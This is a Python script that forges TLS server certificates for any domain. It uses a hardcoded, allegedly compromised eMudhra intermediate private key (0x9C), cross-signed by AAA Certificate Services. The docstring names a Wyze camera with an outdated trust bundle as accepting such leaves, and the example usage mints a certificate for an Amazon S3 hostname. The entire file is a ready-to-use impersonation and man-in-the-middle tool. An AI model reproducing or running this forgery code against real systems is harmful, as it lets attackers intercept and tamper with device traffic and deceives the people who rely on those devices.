#!/usr/bin/env python3
"""Mint a leaf under the compromised eMudhra intermediate (cross-signed by AAA).

The eMudhra incident (2026-10-20) left eight P-384 intermediates whose private keys are integers
below 256 (the published ones are literally 0x01..0x9c), and the mitigation removes two *roots* from
trust stores. Any device whose bundle predates the mitigation — like the Wyze camera, which ships
AAA Certificate Services and emSign ECC Root CA - G3 — still validates a leaf minted this way.

  mint_emudhra_leaf.py --dns s3-us-west-2.amazonaws.com --dns other.example --out /tmp/x

Writes <out>.pem (leaf), <out>.key and <out>-chain.pem (leaf + the cross-signed intermediate).
Verify against a device bundle with:
  openssl verify -CAfile <device cacert.pem> -untrusted <intermediate> <leaf>
"""
import argparse, datetime, sys
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID

D = 0x9C  # EM DV TLS CA - G3B, recovered (published key: ...9c) and independently brute-forced


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dns", action="append", required=True)
    ap.add_argument("--cn", help="subject CN (defaults to the first --dns)")
    ap.add_argument("--out", required=True)
    ap.add_argument("--intermediate", default="emudhra_int_cross.pem")
    a = ap.parse_args()

    inter = x509.load_pem_x509_certificate(open(a.intermediate, "rb").read())
    ca = ec.derive_private_key(D, ec.SECP384R1())
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, a.cn or a.dns[0])]))
        .issuer_name(inter.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=730))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(True, False, True, False, False, False, False, False, False), critical=True)
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(n) for n in a.dns]), critical=False)
        .sign(ca, hashes.SHA384())
    )
    open(f"{a.out}.pem", "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(f"{a.out}.key", "wb").write(leaf_key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    open(f"{a.out}-chain.pem", "wb").write(
        cert.public_bytes(serialization.Encoding.PEM) + open(a.intermediate, "rb").read())
    print(f"minted {cert.subject.rfc4514_string()} for {', '.join(a.dns)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
